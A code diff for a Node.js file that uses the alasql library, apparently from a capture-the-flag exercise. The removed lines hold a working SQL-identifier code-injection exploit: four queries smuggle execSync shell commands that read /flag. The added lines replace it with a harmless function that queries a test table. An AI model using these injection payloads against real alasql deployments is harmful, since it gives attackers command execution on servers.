@@ -1,20 +1,20 @@
 const alasql = require('alasql');
 
-const genPayload = command => `
-new Function(
-    'return this.process.mainModule.require'
-)()('child_process').execSync(${JSON.stringify(command)})
-`;
+// getFlag 함수 정의
+alasql.fn.getFlag = function() {
+    // CREATE TABLE 쿼리 실행
+    alasql('CREATE TABLE woo (a INT, b INT);');
 
+    // INSERT INTO 쿼리 실행
+    alasql('INSERT INTO woo VALUES (1, 2);');
 
-res = alasql(
-    // Initialize the database
-    'CREATE table i_am_a_table;' +
-    `INSERT INTO i_am_a_table VALUES (1337);` +
+    // SELECT 쿼리로 결과 반환
+    const result = alasql('SELECT * FROM woo');
+    
+    // 반환할 결과
+    return `This is a flag string. Query result: ${JSON.stringify(result)}`;
+};
 
-    // Code injection in four different ways
-    `UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42;` +
-    `SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(/flag)")}+'];` +
-    `SELECT \`'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(/flag)")}+'\` from i_am_a_table where 1;` +
-    `SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');`
-);
+// 예시로 함수 호출
+const flag = alasql.fn.getFlag();
+console.log(flag);  // "This is a flag string. Query result: [{a: 1, b: 2}]"
